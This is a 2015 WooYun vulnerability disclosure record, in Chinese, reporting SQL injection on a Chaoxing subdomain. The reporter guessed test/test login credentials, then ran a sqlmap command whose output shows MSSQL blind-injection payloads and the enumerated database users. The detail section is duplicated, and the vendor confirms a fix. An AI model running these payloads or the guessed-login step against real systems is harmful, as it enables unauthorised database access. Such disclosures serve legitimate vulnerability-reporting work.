{"id": 32948, "wybug_id": "wooyun-2015-0109956", "wybug_title": "超星网某分站sql注入", "wybug_corp": "超星网", "wybug_author": "好基友一辈子", "wybug_date": "2015-05-03 21:20", "wybug_open_date": "2015-06-20 11:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-20：\t细节向公众公开  简要描述： 又一个注入 详细说明：  漏洞网站：ssvideo.chaoxing.com网站需要登录才能访问，手工猜出来一个test/test登录之后即可访问网站。存在漏洞的页面recommendlist.asp\n[root@Hacker~]# Sqlmap -u \"http://ssvideo.chaoxing.com/recommendlist.asp?order=1&recommend=list\" -p order --users    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 18:30:20[18:30:20] [INFO] resuming back-end DBMS 'microsoft sql server'[18:30:21] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: order    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)    Payload: order=(SELECT (CASE WHEN (9473=9473) THEN 1 ELSE 9473*(SELECT 9473FROM master..sysdatabases) END))&recommend=list    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)    Payload: order=(SELECT (CASE WHEN (9922=9922) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 9922 END))&recommend=list---[18:30:21] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2005[18:30:21] [INFO] fetching database users[18:30:21] [INFO] fetching number of database users[18:30:21] [INFO] resumed: 2[18:30:21] [INFO] resumed: sa[18:30:21] [INFO] resumed: ssvideo_userdatabase management system users [2]:[*] sa[*] ssvideo_user[18:30:21] [INFO] fetched data logged to text files under 'C:\\Users\\1\\Desktop\\SQLMAP~1.4\\SQLMAP~1.4\\Bin\\output\\ssvideo.chaoxing.com'[*] shutting down at 18:30:21[root@Hacker~]# Sqlmap\n盲注什么的。。网太卡就不深入了。。这个洞审核的时候需要多测试几遍，有时候sqlmap注入会超时。。如果检测的时候出错可以手工证明一下\n\n   漏洞证明：  漏洞网站：ssvideo.chaoxing.com网站需要登录才能访问，手工猜出来一个test/test登录之后即可访问网站。存在漏洞的页面recommendlist.asp\n[root@Hacker~]# Sqlmap -u \"http://ssvideo.chaoxing.com/recommendlist.asp?order=1&recommend=list\" -p order --users    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 18:30:20[18:30:20] [INFO] resuming back-end DBMS 'microsoft sql server'[18:30:21] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: order    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)    Payload: order=(SELECT (CASE WHEN (9473=9473) THEN 1 ELSE 9473*(SELECT 9473FROM master..sysdatabases) END))&recommend=list    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)    Payload: order=(SELECT (CASE WHEN (9922=9922) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE 9922 END))&recommend=list---[18:30:21] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2005[18:30:21] [INFO] fetching database users[18:30:21] [INFO] fetching number of database users[18:30:21] [INFO] resumed: 2[18:30:21] [INFO] resumed: sa[18:30:21] [INFO] resumed: ssvideo_userdatabase management system users [2]:[*] sa[*] ssvideo_user[18:30:21] [INFO] fetched data logged to text files under 'C:\\Users\\1\\Desktop\\SQLMAP~1.4\\SQLMAP~1.4\\Bin\\output\\ssvideo.chaoxing.com'[*] shutting down at 18:30:21[root@Hacker~]# Sqlmap\n盲注什么的。。网太卡就不深入了。。这个洞审核的时候需要多测试几遍，有时候sqlmap注入会超时。。如果检测的时候出错可以手工证明一下\n\n   修复方案：     版权声明：转载请注明来源 好基友一辈子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-05-06 11:49 厂商回复： 该漏洞节前已经修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-07 13:22 |    \t\t好基友一辈子 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:37        )\t\t \n  @超星网  你那份报告就是我写的，修复完了该给的rank可别少给哈    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}